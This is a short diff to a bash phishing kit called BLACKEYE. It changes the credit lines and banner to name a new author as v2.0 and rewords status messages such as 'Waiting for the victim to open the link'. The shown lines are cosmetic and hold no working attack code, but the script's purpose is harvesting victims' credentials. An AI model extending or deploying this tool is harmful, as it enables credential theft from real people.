@@ -1,7 +1,6 @@
 #!/bin/bash
-# BLACKEYE v1.0 is an upgrade from original ShellPhish Tool (https://github.com/thelinuxchoice/shellphish) by thelinuxchoice under GNU LICENSE 
-# Coded by: @thelinuxchoice (https://github.com/thelinuxchoice/blackeye)
-# Upgraded by: @suljot_gjoka (https://github.com/whiteeagle0/blackeye)
+# BLACKEYE v2.0 is an upgrade from original Blackeye Tool (https://github.com/x3rz/blackeye) by @x3rz under a GNU (GENERAL PUBLIC) LICENSE
+
 
 
 trap 'printf "\n";stop;exit 1' 2
@@ -217,7 +216,7 @@ printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and ar
 printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
 printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
 printf "\n"
-printf "     \e[101m\e[1;77m::     BLACKEYE v1.5! By @suljot_gjoka & @thelinuxchoice     ::\e[0m\n"
+printf "     \e[101m\e[1;77m::     BLACKEYE v2.0! By @j-dogcoder    ::\e[0m\n"
 printf "\n"
 }
 
@@ -281,7 +280,7 @@ exit 1
 }
 
 getcredentials() {
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials ...\e[0m\n"
 while [ true ]; do
 
 
@@ -440,7 +439,7 @@ checkfound
 checkfound() {
 
 
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for the victim to open the link ...\e[0m\n"
 while [ true ]; do
 
 
